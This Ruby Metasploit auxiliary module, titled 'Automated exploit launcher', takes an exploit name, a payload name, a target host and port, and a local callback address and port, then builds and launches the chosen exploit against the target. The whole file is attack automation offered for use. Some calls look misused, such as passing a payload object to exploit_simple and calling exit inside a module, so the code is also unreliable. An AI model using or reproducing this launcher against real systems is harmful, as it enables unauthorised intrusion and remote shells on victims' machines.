#!/usr/bin/env ruby
# frozen_string_literal: true

require 'msf/core'

# a custom module
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize
    super(
      'Name' => 'Automated exploit launcher',
      'Description' => 'Automates exploit and payload execution with user input',
      'Author' => 'Solo',
      'License' => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('EXPLOIT', [true, 'Exploit to use']),
        OptString.new('PAYLOAD', [true, 'Payload to use']),
        OptAddress.new('RHOST', [true, 'Target IP address']),
        OptPort.new('RPORT', [true, 'Target port']),
        OptAddress.new('LHOST', [true, 'Local IP address']),
        OptPort.new('LPORT', [true, 'Local port'])
      ]
    )
  end

  def run
    # Main method

    exploit_name = datastore['EXPLOIT']
    rhost_name = datastore['RHOST']
    rport_name = datastore['RPORT']
    payload_name = datastore['PAYLOAD']
    lhost_name = datastore['LHOST']
    lport_name = datastore['LPORT']

    # Print the module config
    print_config(exploit_name, rhost_name, payload_name)

    # Create payload and exploit
    exploit = create_exploit(exploit_name)
    payload = create_payload(payload_name)

    # Set the exploit and payload options
    exploit.datastore['RHOST'] = rhost_name
    exploit.datastore['RPORT'] = rport_name
    payload.datastore['LHOST'] = lhost_name
    payload.datastore['LPORT'] = lport_name

    # Run the exploit
    exploit.exploit_simple(
      'Payload' => payload
    )
  end

  def print_config(exploit, rhost, payload)
    print_status("Launching exploit #{exploit} against #{rhost} with payload #{payload}")
  end

  def create_exploit(exploit_name)
    # Create and error check exploit
    exploit = framework.modules.create(exploit_name)

    if exploit.nil?
      print_error("Unable to find exploit #{exploit_name}")
      exit(1)
    else
      print_good("Found exploit #{exploit_name}")
      exploit
    end
  end

  def create_payload(payload_name)
    # Create and error check payload
    payload = framework.modules.create(payload_name)

    if payload.nil?
      print_error("Unable to find payload #{payload_name}")
      exit(1)
    else
      print_good("Found payload #{payload_name}")
      payload
    end
  end
end

